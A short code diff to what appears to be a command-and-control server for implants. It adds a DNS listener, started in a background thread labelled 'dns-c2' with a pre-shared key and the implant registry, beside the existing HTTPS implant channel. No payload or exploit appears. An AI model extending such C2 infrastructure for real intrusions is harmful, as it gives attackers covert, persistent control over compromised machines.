@@ -1,6 +1,7 @@
 import argparse
 import asyncio
 import logging
+import threading
 from pathlib import Path
 
 import uvicorn
@@ -36,6 +37,7 @@ async def main():
                         help="Enable HTTPS on uvicorn for HTTP-mode implants")
     parser.add_argument("--http-c2-port", type=int, default=443,
                         help="HTTPS port for HTTP-mode implants (default 443)")
+    parser.add_argument("--dns-port", type=int, default=10053)
     args = parser.parse_args()
 
     # Initialize database
@@ -46,6 +48,10 @@ async def main():
     registry = Registry()
     event_bus = EventBus()
     salt = load_salt()
+
+    from .dns_server import DnsServer as _DnsServer
+    _ds = _DnsServer(port=args.dns_port, psk=PSK, salt=salt, registry=registry)
+    threading.Thread(target=_ds.start, daemon=True, name="dns-c2").start()
 
     # Client connection handler with event bus
     async def on_client(reader, writer, crypto, addr):
